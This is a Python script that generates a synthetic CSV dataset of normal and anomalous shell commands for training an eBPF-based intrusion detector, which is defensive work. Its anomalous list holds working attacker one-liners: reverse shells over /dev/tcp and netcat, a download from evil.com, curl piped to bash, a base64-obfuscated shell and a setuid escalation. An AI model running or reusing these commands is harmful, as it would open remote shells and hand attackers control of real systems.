import csv
import random

# We define Normal behaviour

NORMAL_COMMANDS = [
    ("bash", "/usr/bin/ls -la /var/log"),
    ("bash", "/usr/bin/cat /etc/hosts"),
    ("bash", "/usr/bin/grep 'error' /var/log/syslog"),
    ("cron", "/usr/sbin/logrotate /etc/logrotate.conf"),
    ("systemd", "/usr/lib/systemd/systemd-journald"),
    ("dockerd", "usr/bin/docker ps"),
    ("python3", "/usr/bin/python3 app.py"),
    ("sh", "/bin/sh -c date"),
    ("nginx", "/usr/sbin/nginx -g daemon off;"),
    ("postgres", "/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data")
]

# 2. Define "Anomolous" Attacker Behaviour

ANOMALOUS_COMMANDS = [
    ("sh", "/bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1"), # Reverse shell
    ("bash", "/usr/bin/wget http://evil.com/miner.sh -O /tmp/miner.sh"), # Dropper
    ("bash", "/usr/bin/curl -s http://192.168.1.100/payload | bash"), # Fileless execution
    ("sh", "/usr/bin/nc -e /bin/sh 10.0.0.1 8080"), # Netcat shell
    ("bash", "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | sh"), # Obfuscation
    ("python3", "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"), # TTY shell upgrade
    ("sh", "chmod +s /bin/bash") # Privilege Escalation
]

# 3. Generate the Dataset

def generate_data(num_normal=5000, num_anomalies=50):
    dataset = []

    # Generate normal traffic (label = 0)
    for _ in range(num_normal):
        parent, cmd = random.choice(NORMAL_COMMANDS)
        # Add slight variations to make data realistic
        if "grep" in cmd:
            cmd += f" | wc -l"
        dataset.append([parent, cmd, 0])

    for _ in range(num_anomalies):
        parent, cmd = random.choice(ANOMALOUS_COMMANDS)
        dataset.append([parent, cmd, 1])

    # Shuffle the dataset so anomalies are scattered
    random.shuffle(dataset)
    return dataset

if __name__ == "__main__":
    print(" Generating synthetic eBPF Telemetry Dataset...")
    data = generate_data()

    csv_file = "ml_model/training_data.csv"
    with open(csv_file, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["parent_comm", "executed_cmd", "is_anomaly"])
        writer.writerows(data)

    print(f"Dataset generated successfully: {csv_file}")
    print(f"Total Records: {len(data)} (Anomalies: 50)")
